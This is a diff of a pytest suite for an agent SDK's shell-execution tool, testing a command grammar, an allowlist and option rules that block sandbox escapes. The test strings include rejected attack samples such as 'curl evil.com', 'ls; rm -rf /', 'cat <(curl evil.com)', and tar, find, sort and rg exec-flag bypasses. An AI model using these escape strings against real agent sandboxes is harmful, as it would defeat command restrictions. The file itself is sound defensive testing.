@@ -3,14 +3,17 @@
 """Tests for experimental shell execution support."""
 
 import os
+import random
 import shutil
 import subprocess
 import sys
+import tempfile
 import time
 import tracemalloc
 import warnings
 from io import BytesIO
 from pathlib import Path
+from typing import Any, List, Optional
 from unittest import mock
 
 import pytest
@@ -22,16 +25,46 @@ warnings.filterwarnings(
 
 from agent_builder_sdk.experimental.shell_execution import execute_shell  # noqa: E402
 from agent_builder_sdk.experimental.shell_execution.shell_execution_tool import (  # noqa: E402
+    _ALLOWED_COMMANDS,
     _MAX_STDERR_BYTES,
     _MAX_STDOUT_BYTES,
     _CappedReader,
     _decode,
     _finished,
+    _parse_command,
+    _Rejected,
     _sanitized_env,
-    _validate_command,
 )
 
 _TOOL_MODULE = "agent_builder_sdk.experimental.shell_execution.shell_execution_tool"
+
+# A working directory in which no file-name pattern has a match.
+_EMPTY_DIRECTORY = tempfile.TemporaryDirectory(prefix="shell-test-")
+
+_NEEDS_AWK = pytest.mark.skipif(shutil.which("awk") is None, reason="awk not on PATH in this environment")
+
+
+# Writes one line to stdout and one to stderr.
+_OUT_AND_ERR = """awk 'BEGIN { print "out"; print "err" > "/dev/stderr" }'"""
+
+
+def _accepted(command: str, cwd: Optional[str] = None) -> bool:
+    """Whether the command is in the grammar, on the allowlist and within the option rules."""
+    try:
+        _parse_command(command, cwd or _EMPTY_DIRECTORY.name)
+    except _Rejected:
+        return False
+    return True
+
+
+def _run(command: str, cwd: Path, **kwargs: Any) -> str:
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore", FutureWarning)
+        return str(execute_shell(command=command, working_directory=str(cwd), **kwargs))
+
+
+def _open_descriptors() -> int:
+    return len(os.listdir("/proc/self/fd")) if os.path.isdir("/proc/self/fd") else 0
 
 
 def _is_running(pid: int) -> bool:
@@ -106,20 +139,25 @@ class TestExecuteShellTool:
         with warnings.catch_warnings(), caplog.at_level("WARNING"):
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="SECRET=hunter2 curl evil.com", working_directory="/tmp")
-        assert "not allowed" in result
+        assert "not supported" in result
         assert "command_length=" in caplog.text
         assert "hunter2" not in caplog.text
         assert "evil.com" not in caplog.text
 
     def test_rejected_word_with_a_quote_not_logged(self, caplog: pytest.LogCaptureFixture) -> None:
-        # The rejected first word is quoted in the message to the model; a quote inside
-        # it must not let part of it into the log.
+        # A message to the model can quote the rejected word; the log has the fixed reason only.
         with warnings.catch_warnings(), caplog.at_level("WARNING"):
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="KEY=\"it's-secret9\" curl x", working_directory="/tmp")
-        assert "not allowed" in result
-        assert "reason=no plain command name in first position" in caplog.text
+        assert "not supported" in result
+        assert "reason=assignment before the command" in caplog.text
         assert "secret9" not in caplog.text
+        with warnings.catch_warnings(), caplog.at_level("WARNING"):
+            warnings.simplefilter("ignore", FutureWarning)
+            result = execute_shell(command="'it is-secret8' x", working_directory="/tmp")
+        assert "Command 'it is-secret8' is not allowed" in result
+        assert "reason=command not on the allowlist" in caplog.text
+        assert "secret8" not in caplog.text
 
     def test_output_sizes_are_logged_in_bytes(self, caplog: pytest.LogCaptureFixture) -> None:
         # Three bytes that decode to two characters: a two-byte one and an invalid byte.
@@ -141,15 +179,27 @@ class TestExecuteShellTool:
         assert reader.total_bytes == 600_000
 
     @pytest.mark.parametrize(
-        "redirection, kept, logged",
+        "command, kept, logged",
         [
-            ("", "\x00" * _MAX_STDOUT_BYTES, "stdout_bytes=100000000, stderr_bytes=0"),
-            (" 1>&2", "[stderr]\n" + "\x00" * _MAX_STDERR_BYTES, "stdout_bytes=0, stderr_bytes=100000000"),
+            pytest.param(
+                "head -c 100000000 /dev/zero",
+                "\x00" * _MAX_STDOUT_BYTES,
+                "stdout_bytes=100000000, stderr_bytes=0",
+                id="stdout",
+            ),
+            pytest.param(
+                # 100 times a string of 2**20 characters.
+                """awk 'BEGIN { s = "0"; while (length(s) < 1000000) s = s s; """
+                """for (i = 0; i < 100; i++) printf "%s", s > "/dev/stderr" }'""",
+                "[stderr]\n" + "0" * _MAX_STDERR_BYTES,
+                "stdout_bytes=0, stderr_bytes=104857600",
+                id="stderr",
+                marks=_NEEDS_AWK,
+            ),
         ],
-        ids=["stdout", "stderr"],
     )
     def test_output_far_over_the_limit_is_not_held_in_memory(
-        self, caplog: pytest.LogCaptureFixture, redirection: str, kept: str, logged: str
+        self, caplog: pytest.LogCaptureFixture, command: str, kept: str, logged: str
     ) -> None:
         # 100 MB of output on stdout, then on stderr: the result is cut at the limit of
         # the stream, and the agent process must not hold the rest while the command runs.
@@ -157,9 +207,7 @@ class TestExecuteShellTool:
         try:
             with warnings.catch_warnings(), caplog.at_level("INFO"):
                 warnings.simplefilter("ignore", FutureWarning)
-                result = execute_shell(
-                    command="head -c 100000000 /dev/zero" + redirection, working_directory="/tmp"
-                )
+                result = execute_shell(command=command, working_directory="/tmp")
             peak_bytes = tracemalloc.get_traced_memory()[1]
         finally:
             tracemalloc.stop()
@@ -191,170 +239,363 @@ class TestExecuteShellTool:
                 os.close(fd)
         assert result == "[exit code: 0]"
 
-    def test_timeout_kills_whole_process_tree(self, tmp_path: Path) -> None:
-        # A grandchild of the shell must be killed on timeout, not orphaned. awk starts in
+    @_NEEDS_AWK
+    def test_timeout_kills_the_process_tree_of_every_stage(self, tmp_path: Path) -> None:
+        # A child of each stage must be killed on timeout, not orphaned. awk starts in
         # milliseconds, so the probe runs long before the timeout: the shell of its
         # system() call records its own PID and then becomes the sleep.
-        if shutil.which("awk") is None:
-            pytest.skip("awk not on PATH in this environment")
-
-        # Per-test path: two test runs on one host must not share the file.
-        pidfile = tmp_path / "shell_timeout_probe.pid"
-        cmd = f"""awk 'BEGIN {{ system("echo $$ > {pidfile}; exec sleep 30") }}'"""
-        with warnings.catch_warnings():
-            warnings.simplefilter("ignore", FutureWarning)
-            result = execute_shell(command=cmd, working_directory="/tmp", timeout_seconds=1)
+        # Per-test paths: two test runs on one host must not share the files.
+        pidfiles = [tmp_path / "first_stage.pid", tmp_path / "second_stage.pid"]
+        cmd = " | ".join(
+            f"""awk 'BEGIN {{ system("echo $$ > {pidfile}; exec sleep 30") }}'""" for pidfile in pidfiles
+        )
+        result = _run(cmd, tmp_path, timeout_seconds=1)
         assert "timed out" in result
-        grandchild_pid = int(pidfile.read_text())
+        for pidfile in pidfiles:
+            child_pid = int(pidfile.read_text())
+            deadline = time.monotonic() + 5
+            while _is_running(child_pid) and time.monotonic() < deadline:
+                time.sleep(0.05)
+            assert not _is_running(child_pid)
+
+    def test_a_stage_that_does_not_start_ends_the_stages_before_it(self, tmp_path: Path) -> None:
+        started: List["subprocess.Popen[bytes]"] = []
+        real_popen = subprocess.Popen
+
+        def second_stage_fails(*args: Any, **kwargs: Any) -> "subprocess.Popen[bytes]":
+            if started:
+                raise OSError("no more processes")
+            started.append(real_popen(*args, **kwargs))
+            return started[0]
+
+        descriptors = _open_descriptors()
+        with mock.patch(f"{_TOOL_MODULE}.subprocess.Popen", second_stage_fails):
+            result = _run("tail -f /dev/null | cat", tmp_path)
+        assert result == "Error: Shell execution failed: no more processes"
+        assert started[0].returncode == -9
+        # The readers close their pipes when the killed stage is gone.
         deadline = time.monotonic() + 5
-        while _is_running(grandchild_pid) and time.monotonic() < deadline:
+        while _open_descriptors() > descriptors and time.monotonic() < deadline:
             time.sleep(0.05)
-        assert not _is_running(grandchild_pid)
+        assert _open_descriptors() <= descriptors
+
+    def test_no_descriptor_stays_open_after_a_command(self, tmp_path: Path) -> None:
+        descriptors = _open_descriptors()
+        assert _run("printf 'b\\na\\n' 2>&1 | sort >/dev/null | wc -l", tmp_path) == "0\n\n[exit code: 0]"
+        assert _open_descriptors() <= descriptors
+
+    @_NEEDS_AWK
+    def test_exit_code_of_a_program_that_a_signal_ended(self, tmp_path: Path) -> None:
+        # The shell of the getline prints its parent, awk; awk then kills itself.
+        cmd = """awk 'BEGIN { "echo $PPID" | getline pid; system("kill -9 " pid) }'"""
+        assert _run(cmd, tmp_path) == "[exit code: 137]"
+
+    def test_program_that_is_not_installed(self, tmp_path: Path) -> None:
+        with mock.patch.dict(os.environ, {"PATH": str(tmp_path)}):
+            assert _run("ls", tmp_path) == (
+                "Error: Command 'ls' is on the allowlist but is not installed in this container."
+            )
+
+    def test_relative_path_entry_is_not_searched(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+        # With `.` in PATH, a file named `ls` in a directory that a command can write
+        # would run in place of the program.
+        (tmp_path / "ls").write_text("#!/bin/sh\necho planted\n")
+        (tmp_path / "ls").chmod(0o755)
+        monkeypatch.chdir(tmp_path)
+        with mock.patch.dict(os.environ, {"PATH": os.pathsep.join([".", "", os.environ["PATH"]])}):
+            result = _run("ls", tmp_path)
+        assert result == "ls\n\n[exit code: 0]"
+
+    def test_command_that_cannot_be_encoded_is_an_error(self, tmp_path: Path) -> None:
+        # A lone surrogate, which a JSON tool input can hold, has no file-name encoding.
+        assert _run("echo a\ud800*", tmp_path).startswith("Error: Shell execution failed: 'utf-8' codec can't encode")
+        assert _run("echo a\ud800", tmp_path).startswith("Error: Shell execution failed: 'utf-8' codec can't encode")
+
+    def test_pattern_matches_are_sorted(self, tmp_path: Path) -> None:
+        for name in "3857096142":
+            (tmp_path / f"{name}.dat").write_text("")
+        assert _run("echo *.dat", tmp_path) == " ".join(f"{n}.dat" for n in range(10)) + "\n\n[exit code: 0]"
+
+    @pytest.mark.parametrize(
+        "command, message",
+        [
+            ("ls ; id", "Error: ';' between commands is not supported. execute_shell is not a shell."),
+            ("ls || id", "Error: '||' is not supported."),
+            ("ls |& cat", "Error: '|&' is not supported."),
+            ("ls && id", "Error: '&' (a background command, '&&', '&>') is not supported."),
+            ("echo $HOME", "Error: '$' outside single quotes (a variable, $(...), ${...}, $((...)), $'...') is not"),
+            ("echo `id`", "Error: a backtick outside single quotes (command substitution) is not supported."),
+            ("ls > out", "Error: a redirection other than 2>&1, >/dev/null and 2>/dev/null (each a word of its"),
+            ("cat < in", "Error: '<' (input from a file, a here-document) is not supported."),
+            ("(ls)", "Error: a parenthesis (a subshell, a process substitution) is not supported."),
+            ("echo {a,b}", "Error: an unquoted '{' (brace expansion) is not supported."),
+            ("ls ~/x", "Error: a word that starts with '#' (a comment) or '~' (a home directory) is not supported."),
+            ("ls\nid", "Error: a line break outside quotes is not supported."),
+            ("ls \\\n-l", "Error: a backslash at the end of a line is not supported."),
+            ("A=1 ls", "Error: A variable assignment in front of a program (NAME=value) is not supported."),
+            ("/usr/bin/ls", "Error: Give the program by its name ('ls'), not by a path."),
+            ("ls |", "Error: A program name is missing: the command, or one side of a pipe (|), is empty."),
+            ("ls 'a", "Error: The command has an unterminated quote."),
+            ("ls \\", "Error: The command ends with a backslash."),
+            ("ls a\0b", "Error: The command contains a NUL character."),
+            ("curl x", "Error: Command 'curl' is not allowed. Allowed commands: [, awk, basename,"),
+        ],
+    )
+    def test_rejection_names_the_unsupported_form(self, tmp_path: Path, command: str, message: str) -> None:
+        assert _run(command, tmp_path).startswith(message)
+
+    def test_pattern_with_too_many_matches_is_rejected(self, tmp_path: Path) -> None:
+        for name in ("a.txt", "b.txt", "c.txt"):
+            (tmp_path / name).write_text("")
+        with mock.patch(f"{_TOOL_MODULE}._MAX_PATTERN_MATCHES", 3):
+            assert _run("echo *.txt", tmp_path) == "a.txt b.txt c.txt\n\n[exit code: 0]"
+        with mock.patch(f"{_TOOL_MODULE}._MAX_PATTERN_MATCHES", 2):
+            assert _run("echo *.txt", tmp_path) == (
+                "Error: A file-name pattern matches more than 2 names. Narrow the pattern."
+            )
+
+    @pytest.mark.parametrize(
+        "command, result",
+        [
+            # Pipes; the exit code is that of the last stage.
+            ("echo hello | tr a-z A-Z", "HELLO\n\n[exit code: 0]"),
+            ("printf '%s\\n' b a c | sort | head -2", "a\nb\n\n[exit code: 0]"),
+            ("yes | head -1", "y\n\n[exit code: 0]"),
+            ("false | true", "[exit code: 0]"),
+            ("true | false", "[exit code: 1]"),
+            ("ls|wc -l", "3\n\n[exit code: 0]"),
+            # Quotes and escapes.
+            ("echo 'a  b' \"c  d\" e\\ f", "a  b c  d e f\n\n[exit code: 0]"),
+            (
+                "echo 'x; y | z & $HOME `id` $(id) > f # ~ {a,b} *'",
+                "x; y | z & $HOME `id` $(id) > f # ~ {a,b} *\n\n[exit code: 0]",
+            ),
+            ("echo \"x; y | z & > f # ~ {a,b} * 'q'\"", "x; y | z & > f # ~ {a,b} * 'q'\n\n[exit code: 0]"),
+            (
+                'echo "say \\"hi\\"" "back\\\\slash" "\\$5" "\\`" "a\\b"',
+                'say "hi" back\\slash $5 ` a\\b\n\n[exit code: 0]',
+            ),
+            ("echo \\$HOME \\; \\| \\> \\'", "$HOME ; | > '\n\n[exit code: 0]"),
+            ("printf '%s|' a '' \"\" b", "a|||b|\n[exit code: 0]"),
+            ("printf '%s' 'line1\nline2'", "line1\nline2\n[exit code: 0]"),
+            ("echo a#b a~b }", "a#b a~b }\n\n[exit code: 0]"),
+            # File-name patterns: sorted matches, the word as written without a match.
+            ("echo *.txt", "a.txt b.txt\n\n[exit code: 0]"),
+            ("echo [ab].txt ?.txt sub/*", "a.txt b.txt a.txt b.txt sub/c.csv\n\n[exit code: 0]"),
+            ("echo '*.txt' \\*.txt \"*.txt\" 'a'*", "*.txt *.txt *.txt a.txt\n\n[exit code: 0]"),
+            ("echo *.none [x", "*.none [x\n\n[exit code: 0]"),
+            ("echo '?'.t* \\[ab].t*", "?.t* [ab].t*\n\n[exit code: 0]"),
+            ("echo *", "a.txt b.txt sub\n\n[exit code: 0]"),
+            ("[ -d sub ]", "[exit code: 0]"),
+            # The three redirections, in the order written.
+            pytest.param(_OUT_AND_ERR, "out\n\n[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " 2>/dev/null", "out\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " >/dev/null", "[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " 1> /dev/null", "[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " 2>&1 | sort", "err\nout\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " >/dev/null 2>&1", "[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " 2>&1 >/dev/null", "err\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " | wc -l", "1\n\n[stderr]\nerr\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            pytest.param(_OUT_AND_ERR + " 2>&1 | wc -l", "2\n\n[exit code: 0]", marks=_NEEDS_AWK),
+            ("echo 2 >/dev/null 2", "[exit code: 0]"),
+        ],
+    )
+    def test_accepted_form_runs(self, tmp_path: Path, command: str, result: str) -> None:
+        for name in ("a.txt", "b.txt", "sub/c.csv", ".hidden"):
+            (tmp_path / name).parent.mkdir(exist_ok=True)
+            (tmp_path / name).write_text("")
+        with mock.patch.dict(os.environ, {"LC_ALL": "C"}):
+            assert _run(command, tmp_path) == result
+
+    def test_no_accepted_command_reaches_a_shell(self, tmp_path: Path) -> None:
+        # 600 pipelines put together at random from programs, arguments and shell syntax.
+        # Whatever the tool starts must be a program of the allowlist, found in PATH and
+        # started without a shell, with the arguments as a list.
+        programs = ["ls", "cat", "echo", "find", "tar", "sort", "wc", "sh", "env", "touch", "/bin/sh", "./sh", "s?"]
+        plain = ["-la", ".", "'a b'", '"x y"', "*", "[s]h", "x", "2>&1", ">/dev/null", "2>/dev/null", "> /dev/null"]
+        syntax = [
+            *("-exec", "sh", "\\;", "--to-command=sh", "-Ish", "cIf", "-T", "A=1", "$(sh)", "`sh`", "$HOME", "${x}"),
+            *("$'x'", "(sh)", "{sh,ls}", "~", "#", "||", "|&", ";", "&", "&&", ">", ">>", "<", "<<EOF", ">&-"),
+            *("<&-", "&>", ">|", "\n", "\\", "'", '"', "\\\n", "=", "/", "|"),
+        ]
+        (tmp_path / "sh").write_text("")
+        started: List[Any] = []
+        real_popen = subprocess.Popen
+
+        def record(argv: Any, **kwargs: Any) -> "subprocess.Popen[bytes]":
+            started.append((argv, kwargs))
+            return real_popen(["true"], **{**kwargs, "executable": shutil.which("true")})
+
+        generator = random.Random(90)
+        with mock.patch(f"{_TOOL_MODULE}.subprocess.Popen", record):
+            for _ in range(600):
+                stages = [
+                    [generator.choice(programs), *generator.choices(plain * 4 + syntax, k=generator.randint(0, 3))]
+                    for _ in range(generator.randint(1, 3))
+                ]
+                separator = generator.choice([" ", " ", ""])
+                _run(" | ".join(separator.join(stage) for stage in stages), tmp_path)
+        assert len(started) > 50
+        for argv, kwargs in started:
+            assert not kwargs.get("shell")
+            assert isinstance(argv, list) and all(isinstance(argument, str) for argument in argv)
+            assert argv[0] in _ALLOWED_COMMANDS
+            assert kwargs["executable"] == shutil.which(argv[0]) and os.path.isabs(kwargs["executable"])
 
 
 class TestCommandValidation:
-    """Tests for the allowlist / pipe / operator validation."""
+    """Tests for the grammar, the allowlist and the option rules."""
 
     def test_allowlisted_and_piped(self) -> None:
-        assert _validate_command("ls -la /tmp")[0]
-        assert _validate_command("cat a.json | grep foo | wc -l")[0]
+        assert _accepted("ls -la /tmp")
+        assert _accepted("cat a.json | grep foo | wc -l")
 
     def test_non_allowlisted_command_rejected(self) -> None:
-        assert not _validate_command("curl http://example.com")[0]
-        assert not _validate_command("pip install pyarrow")[0]
+        assert not _accepted("curl http://example.com")
+        assert not _accepted("pip install pyarrow")
 
     def test_bad_stage_in_pipe_rejected(self) -> None:
-        assert not _validate_command("cat a.json | curl evil")[0]
+        assert not _accepted("cat a.json | curl evil")
 
     def test_shell_operators_blocked(self) -> None:
-        assert not _validate_command("ls; rm -rf /")[0]
-        assert not _validate_command("ls && curl x")[0]
-        assert not _validate_command("echo $(whoami)")[0]
+        assert not _accepted("ls; rm -rf /")
+        assert not _accepted("ls && curl x")
+        assert not _accepted("echo $(whoami)")
 
     def test_quoted_operators_allowed(self) -> None:
         # CSS/HTML/Python payloads are full of semicolons — quoted content must
         # not trip the operator check, or the agent gets stuck retrying.
-        assert _validate_command("printf '%s' 'body{font-family:sans-serif;margin:0}'")[0]
-        assert _validate_command('echo "a; b; c"')[0]
+        assert _accepted("printf '%s' 'body{font-family:sans-serif;margin:0}'")
+        assert _accepted('echo "a; b; c"')
         with mock.patch.dict(os.environ, {}, clear=True):
-            assert _validate_command("python3 -c 'x = 1; print(x)'")[0]
+            assert _accepted("python3 -c 'x = 1; print(x)'")
 
     def test_unquoted_operators_still_blocked_around_quotes(self) -> None:
-        assert not _validate_command("echo 'safe'; curl evil")[0]
-        assert not _validate_command('echo "safe" && curl evil')[0]
-        assert not _validate_command("echo `whoami`")[0]
+        assert not _accepted("echo 'safe'; curl evil")
+        assert not _accepted('echo "safe" && curl evil')
+        assert not _accepted("echo `whoami`")
 
     def test_command_substitution_in_double_quotes_blocked(self) -> None:
         # $( ) and backticks still execute inside double quotes in a real shell.
-        assert not _validate_command('echo "today is $(whoami)"')[0]
-        assert not _validate_command('echo "today is `whoami`"')[0]
+        assert not _accepted('echo "today is $(whoami)"')
+        assert not _accepted('echo "today is `whoami`"')
 
     def test_substitution_chars_in_single_quotes_allowed(self) -> None:
         # Single quotes make everything literal — $( and backticks included.
-        assert _validate_command("echo 'costs $(a lot)'")[0]
-        assert _validate_command("echo 'back`tick`'")[0]
+        assert _accepted("echo 'costs $(a lot)'")
+        assert _accepted("echo 'back`tick`'")
 
     def test_unquoted_newline_blocked(self) -> None:
-        # An unquoted newline is a command separator: bash runs both commands, so
-        # it must be rejected outright (not merely split-and-revalidated, since
-        # the second command may itself be allowlisted, e.g. rm).
-        assert not _validate_command("echo safe\nrm -rf /tmp/x")[0]
-        assert not _validate_command("ls\ncurl evil.com")[0]
-        assert not _validate_command("ls\npwd")[0]
+        # An unquoted newline separates commands in a shell. Here it is rejected, also
+        # when the second command is allowlisted (rm): the tool runs one pipeline.
+        assert not _accepted("echo safe\nrm -rf /tmp/x")
+        assert not _accepted("ls\ncurl evil.com")
+        assert not _accepted("ls\npwd")
+        assert not _accepted("echo a\rb")
 
     def test_quoted_newline_allowed(self) -> None:
         # A newline inside quotes is literal content, not a separator.
-        assert _validate_command("printf 'line1\nline2'")[0]
+        assert _accepted("printf 'line1\nline2'")
 
     def test_env_wrapper_rejected(self) -> None:
         # `env` runs an arbitrary binary AND can re-set AWS_PROFILE, defeating
         # both the allowlist and the _sanitized_env stripping. It and the other
         # command wrappers must stay off the allowlist.
-        assert not _validate_command("env FOO=bar /bin/echo pwned")[0]
-        assert not _validate_command("env AWS_PROFILE=persona env")[0]
+        assert not _accepted("env FOO=bar /bin/echo pwned")
+        assert not _accepted("env AWS_PROFILE=persona env")
         for wrapper in ("xargs", "nice", "nohup", "timeout", "time"):
-            assert not _validate_command(f"{wrapper} rm x")[0]
+            assert not _accepted(f"{wrapper} rm x")
 
     def test_exec_delegating_flags_rejected(self) -> None:
         # find -exec / tar --to-command hand execution to an arbitrary child.
-        assert not _validate_command("find /tmp -exec rm {} ;")[0]
-        assert not _validate_command("find /tmp -execdir curl x ;")[0]
-        assert not _validate_command("tar --to-command=curl -cf - /tmp")[0]
-        assert not _validate_command("tar --checkpoint-action=exec=sh -cf a.tar /tmp")[0]
+        assert not _accepted("find /tmp -exec rm {} ;")
+        assert not _accepted("find /tmp -execdir curl x ;")
+        assert not _accepted("tar --to-command=curl -cf - /tmp")
+        assert not _accepted("tar --checkpoint-action=exec=sh -cf a.tar /tmp")
         # find/tar without an exec flag stay usable for inspection.
-        assert _validate_command("find /tmp -name '*.parquet'")[0]
-        assert _validate_command("tar -tzf archive.tar.gz")[0]
+        assert _accepted("find /tmp -name '*.parquet'")
+        assert _accepted("tar -tzf archive.tar.gz")
 
     def test_background_operator_rejected(self) -> None:
-        # A lone `&` backgrounds the first stage and the shell runs whatever
-        # follows, but only the first token is allowlist-checked — so `echo & curl`
-        # smuggles curl past the allowlist. Reject it while keeping the redirection
-        # forms in which every shell reads `&` as part of the operator (2>&1, >&).
-        assert not _validate_command("echo hi & curl evil.com")[0]
-        assert not _validate_command("python3 x.py & curl evil")[0]
-        assert not _validate_command("head -5&curl evil.com")[0]
-        assert not _validate_command("sleep 5 &")[0]
-        # Directly after > or <, & duplicates a file descriptor — these must still pass.
-        assert _validate_command("ls 2>&1")[0]
-        assert _validate_command("ls 1>&2")[0]
-        assert _validate_command("ls > /tmp/x 2>&1")[0]
-        assert _validate_command("cat f >& /tmp/x")[0]
-        assert _validate_command("cat <&0")[0]
+        # In a shell a lone `&` backgrounds the first command and runs whatever follows.
+        assert not _accepted("echo hi & curl evil.com")
+        assert not _accepted("python3 x.py & curl evil")
+        assert not _accepted("head -5&curl evil.com")
+        assert not _accepted("sleep 5 &")
+        # `&` is read in one place only: the redirection 2>&1.
+        assert _accepted("ls 2>&1")
+        assert _accepted("ls >/dev/null 2>&1")
+        assert not _accepted("ls 1>&2")
+        assert not _accepted("ls 2>&11")
+        assert not _accepted("cat f >& /tmp/x")
+        assert not _accepted("cat <&0")
         # A literal & inside quotes is content, not an operator.
-        assert _validate_command("echo 'a & b'")[0]
-        assert _validate_command('echo "a & b"')[0]
+        assert _accepted("echo 'a & b'")
+        assert _accepted('echo "a & b"')
 
     def test_ampersand_before_a_redirection_rejected(self) -> None:
         # bash reads `&>file` as a redirection. A shell without that operator (dash, the
         # /bin/sh of Debian images) reads `ls &` and then runs the rest as a command.
-        assert not _validate_command("ls &>/dev/null touch /tmp/marker")[0]
-        assert not _validate_command("ls &> /tmp/x")[0]
-        assert not _validate_command("ls &>> /tmp/x")[0]
-        assert not _validate_command("ls |& cat")[0]
-        assert not _validate_command("ls >&2 & curl evil.com")[0]
+        assert not _accepted("ls &>/dev/null touch /tmp/marker")
+        assert not _accepted("ls &> /tmp/x")
+        assert not _accepted("ls &>> /tmp/x")
+        assert not _accepted("ls |& cat")
+        assert not _accepted("ls >&2 & curl evil.com")
 
     def test_tar_short_compress_flag_rejected(self) -> None:
         # tar's -I (--use-compress-program) runs an arbitrary program. GNU getopt
         # attaches the arg directly (-Icurl) or bundles the letter after other
         # no-arg flags (-cIcurl), neither of which a whole-word check catches.
-        assert not _validate_command("tar -Icurl -cf - /tmp")[0]
-        assert not _validate_command("tar -cIcurl -f - /tmp")[0]
-        assert not _validate_command("tar -I curl -cf - /tmp")[0]
-        assert not _validate_command("tar -cIgzip -f a.tar /tmp")[0]
+        assert not _accepted("tar -Icurl -cf - /tmp")
+        assert not _accepted("tar -cIcurl -f - /tmp")
+        assert not _accepted("tar -I curl -cf - /tmp")
+        assert not _accepted("tar -cIgzip -f a.tar /tmp")
         # Legit tar must still pass — including an archive name that starts with
         # 'I' attached to -f (-cfInput.tar), which must not read as the -I option.
-        assert _validate_command("tar -tzf archive.tar.gz")[0]
-        assert _validate_command("tar -czf a.tar /tmp")[0]
-        assert _validate_command("tar -cf Input.tar /tmp")[0]
-        assert _validate_command("tar -cfInput.tar /tmp")[0]
+        assert _accepted("tar -tzf archive.tar.gz")
+        assert _accepted("tar -czf a.tar /tmp")
+        assert _accepted("tar -cf Input.tar /tmp")
+        assert _accepted("tar -cfInput.tar /tmp")
         # find -executable must not be mistaken for the -exec primary.
-        assert _validate_command("find /tmp -executable")[0]
+        assert _accepted("find /tmp -executable")
 
     def test_sort_rg_exec_flags_rejected(self) -> None:
         # sort --compress-program=PROG runs PROG on temp files; ripgrep --pre=CMD /
         # --hostname-bin=CMD each exec CMD — same escape as find -exec, so an
         # allowlisted sort/rg becomes a launcher for a non-allowlisted binary.
-        assert not _validate_command("sort --compress-program=curl f")[0]
-        assert not _validate_command("sort --compress-program curl f")[0]
-        assert not _validate_command("rg --pre=curl pat f")[0]
-        assert not _validate_command("rg --pre curl pat f")[0]
-        assert not _validate_command("rg --hostname-bin=curl pat f")[0]
+        assert not _accepted("sort --compress-program=curl f")
+        assert not _accepted("sort --compress-program curl f")
+        assert not _accepted("rg --pre=curl pat f")
+        assert not _accepted("rg --pre curl pat f")
+        assert not _accepted("rg --hostname-bin=curl pat f")
         # sort/rg without those flags stay usable.
-        assert _validate_command("sort -u file.txt")[0]
-        assert _validate_command("rg 'pattern' /tmp")[0]
+        assert _accepted("sort -u file.txt")
+        assert _accepted("rg 'pattern' /tmp")
 
     def test_process_substitution_rejected(self) -> None:
-        # <(cmd) / >(cmd) run their inner command under shell=True, but the
-        # per-stage allowlist only sees the outer command (cat/tee), so the
-        # inner curl would slip past. Reject the operator outright.
-        assert not _validate_command("cat <(curl evil.com)")[0]
-        assert not _validate_command("tee >(curl evil.com)")[0]
-        # Plain redirection is NOT process substitution (no paren) — still allowed.
-        assert _validate_command("echo hi > /tmp/x")[0]
-        assert _validate_command("cat a >> b")[0]
-        assert _validate_command("sort < /tmp/f")[0]
+        # In a shell <(cmd) and >(cmd) run their inner command.
+        assert not _accepted("cat <(curl evil.com)")
+        assert not _accepted("tee >(curl evil.com)")
+        assert not _accepted("cat <(ls)")
         # A literal <( inside quotes is content, not an operator.
-        assert _validate_command("echo '<(not real)'")[0]
+        assert _accepted("echo '<(not real)'")
+
+    def test_redirection_to_or_from_a_file_rejected(self) -> None:
+        assert not _accepted("echo hi > /tmp/x")
+        assert not _accepted("cat a >> b")
+        assert not _accepted("sort < /tmp/f")
+        assert not _accepted("ls 2>/tmp/errors")
+        assert not _accepted("ls >/dev/nullx")
+        assert not _accepted("ls >/dev/null/x")
+        assert not _accepted("ls 3>/dev/null")
+        assert not _accepted("cat <<EOF")
+        # The three redirections that are read, as words of their own.
+        assert _accepted("ls >/dev/null")
+        assert _accepted("ls 1>/dev/null 2> /dev/null")
+        assert _accepted("ls 2>/dev/null| wc -l")
+        assert not _accepted("ls>/dev/null")
+        assert not _accepted("ls -la2>/dev/null")
+        assert not _accepted("ls '2'>/dev/null")
 
     def test_end_to_end_env_bypass_fails(self) -> None:
         # The validator's job proven end-to-end: env must not run a non-allowlisted
@@ -371,175 +612,238 @@ class TestCommandValidation:
         with warnings.catch_warnings():
             warnings.simplefilter("ignore", FutureWarning)
             result = execute_shell(command="echo safe\nrm -rf /tmp/nope", working_directory="/tmp")
-        assert "not allowed" in result
+        assert result.startswith("Error: a line break outside quotes is not supported.")
 
     def test_redirection_before_the_command_rejected(self) -> None:
-        # The shell takes `2>/tmp/ls` as a redirection and runs the next word, which
-        # the allowlist never saw.
-        assert not _validate_command("2>/tmp/ls curl evil.com")[0]
-        assert not _validate_command(">/tmp/ls curl evil.com")[0]
-        assert not _validate_command("ls | </tmp/cat curl evil.com")[0]
-        assert _validate_command("ls 2>/tmp/errors")[0]
-        assert _validate_command("/usr/bin/ls -la")[0]
-        assert _validate_command("[ -d /tmp ]")[0]
+        # A shell takes `2>/tmp/ls` as a redirection and runs the next word.
+        assert not _accepted("2>/tmp/ls curl evil.com")
+        assert not _accepted(">/tmp/ls curl evil.com")
+        assert not _accepted("ls | </tmp/cat curl evil.com")
+        # One of the three redirections is not an argument, wherever it stands.
+        assert _accepted("2>/dev/null ls")
+        assert _accepted("ls | >/dev/null cat")
+        assert not _accepted("2>/dev/null curl evil.com")
+        assert _accepted("[ -d /tmp ]")
+
+    def test_command_given_with_a_path_rejected(self) -> None:
+        # A path can name a file that a command wrote, whatever its base name is.
+        assert not _accepted("/usr/bin/ls -la")
+        assert not _accepted("./ls")
+        assert not _accepted("bin/ls")
+        assert not _accepted("ls | /usr/bin/wc -l")
+        assert _accepted("ls /usr/bin/ls")
+
